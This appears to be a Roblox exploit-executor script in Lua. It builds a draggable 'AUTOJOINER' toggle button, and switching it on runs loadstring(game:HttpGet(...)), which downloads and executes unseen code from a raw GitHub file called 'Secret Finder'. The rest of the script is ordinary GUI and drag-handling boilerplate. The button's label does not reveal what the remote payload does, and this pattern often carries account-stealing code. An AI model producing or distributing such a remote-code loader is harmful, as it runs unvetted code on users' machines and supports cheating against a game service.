-- Instances
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")

-- Properties
ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(0.25, 0, 0.15, 0)
UICorner.Parent = Frame

TextButton.Parent = Frame
TextButton.AnchorPoint = Vector2.new(0.5, 0)
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.5, 0, 0.4, 0)
TextButton.Size = UDim2.new(0.9, 0, 0.5, 0)
TextButton.Font = Enum.Font.FredokaOne
TextButton.Text = "AUTOJOINER: OFF"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextWrapped = true
UICorner_2.Parent = TextButton

-- Button functionality
TextButton.MouseButton1Click:Connect(function()
    if TextButton.Text == "AUTOJOINER: OFF" then
        TextButton.Text = "AUTOJOINER: ON"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/iw929wiwiw/Protector-/refs/heads/main/Secret%20Finder"))()
    else
        TextButton.Text = "AUTOJOINER: OFF"
    end
end)

-- Drag functionality
local UIS = game:GetService("UserInputService")
local dragging = false
local dragInput, dragStart, startPos

Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UIS.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)
